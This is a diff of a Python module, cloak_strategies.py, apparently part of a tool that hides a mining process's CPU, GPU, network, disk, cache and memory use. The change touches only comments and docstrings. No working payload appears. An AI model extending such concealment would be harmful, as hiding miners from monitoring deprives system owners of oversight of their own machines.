@@ -1,6 +1,6 @@
 """
-Mô-đun `cloak_strategies.py` - Các chiến lược [cloaking] (che giấu) cho tiến trình khai thác (đồng bộ).
-CHÚ Ý: Phiên bản này đã loại bỏ hoàn toàn chức năng [restoration] (khôi phục) - chỉ còn [cloaking] (che giấu).
+**Module** (mô-đun hệ thống) `cloak_strategies.py` - **Cloaking strategies** (các chiến lược che giấu – cho tiến trình khai thác đồng bộ).
+**IMPORTANT NOTE** (lưu ý quan trọng): **Restoration removal** (loại bỏ khôi phục – phiên bản này đã loại bỏ hoàn toàn restoration, chỉ còn cloaking).
 """
 # type: ignore
 
@@ -16,16 +16,16 @@ from pathlib import Path
 
 from .utils import MiningProcess
 
-# ✅ UNIFIED LOGGING: Sử dụng hệ thống [logging] (ghi log) tập trung
+# ✅ **UNIFIED LOGGING** (ghi log thống nhất – sử dụng hệ thống logging tập trung)
 from .unified_logging import get_unified_logger
 
-# ✅ ERROR MANAGEMENT: Sử dụng hệ thống xử lý lỗi tập trung
+# ✅ **ERROR MANAGEMENT** (quản lý lỗi – sử dụng hệ thống xử lý lỗi tập trung)
 from .error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error
 
-# ✅ STANDARDIZED: Lấy thể hiện [unified logger] (logger hợp nhất) (khớp phân cấp)
+# ✅ **STANDARDIZED LOGGING** (chuẩn hóa ghi log – lấy unified logger instance khớp phân cấp)
 cloak_logger = get_unified_logger('mining_environment.cloak_strategies')
 
-# ✅ ERROR REPORTER: Lấy thể hiện [error reporter] (bộ báo lỗi) tập trung
+# ✅ **ERROR REPORTER** (bộ báo lỗi – lấy error reporter instance tập trung)
 error_reporter = get_error_reporter()
 
 if TYPE_CHECKING:
@@ -50,8 +50,8 @@ else:
 
 class StrategyType:
     """
-    ✅ ENHANCED: Các loại chiến lược [cloaking] (che giấu) cho [comprehensive resource control] (kiểm soát tài nguyên toàn diện).
-    6 chiến lược đang hoạt động: CPU, GPU (kèm [thermal] – nhiệt), Network, Disk I/O, Cache, Memory
+    ✅ **ENHANCED STRATEGY TYPES** (các loại chiến lược nâng cao – cho comprehensive resource control).
+    **Active strategies** (6 chiến lược đang hoạt động): **CPU**, **GPU** (kèm thermal management), **Network**, **Disk I/O**, **Cache**, **Memory**
     """
     CPU = "cpu"
     NETWORK = "network"
@@ -124,7 +124,7 @@ class CloakStrategy(ABC):
         :return: True nếu strategy có thể áp dụng an toàn
         """
         try:
-            # Base implementation - các subclasses có thể override
+            # **[Base implementation]** (triển khai cơ sở – các subclasses có thể override)
             return True
         except Exception as e:
             if hasattr(self, 'logger'):
@@ -139,7 +139,7 @@ class CloakStrategy(ABC):
         :return: True nếu strategy đã được áp dụng thành công
         """
         try:
-            # Base implementation - các subclasses có thể override
+            # **[Base implementation]** (triển khai cơ sở – các subclasses có thể override)
             return True
         except Exception as e:
             if hasattr(self, 'logger'):
